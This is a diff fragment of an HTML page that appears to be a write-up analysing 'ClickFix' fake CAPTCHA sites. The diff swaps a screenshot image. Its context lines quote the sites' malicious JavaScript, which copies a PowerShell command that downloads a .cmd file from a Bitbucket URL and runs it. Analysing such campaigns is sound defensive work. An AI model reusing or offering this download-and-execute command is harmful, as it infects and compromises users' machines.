@@ -36,7 +36,7 @@
                 </ul>
                 <img src="../img/clickfix/google.png" alt="Google search result screenshot">
                 <br>
-                <img src="../img/clickfix/alitraders.png" alt="Fake CAPTCHA verification screenshot">
+                <img src="../img/clickfix/clickfix.gif" alt="Fake CAPTCHA verification screenshot">
                 <p>Upon accessing these sites, I noticed they all used a fake CAPTCHA with malicious JavaScript. This script is triggered when you click "I'm not a robot." Here's an example of the code used:</p>
                 <pre><code class="language-javascript">function verifyHuman() {
     const textToCopy = "powershell.exe -Command \"Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command \\\"Invoke-WebRequest -Uri https://bitbucket.org/dlo2/a/downloads/ip2.cmd -OutFile $env:TEMP\\ip2.cmd; Start-Process $env:TEMP\\ip2.cmd\\"' -NoNewWindow\"";
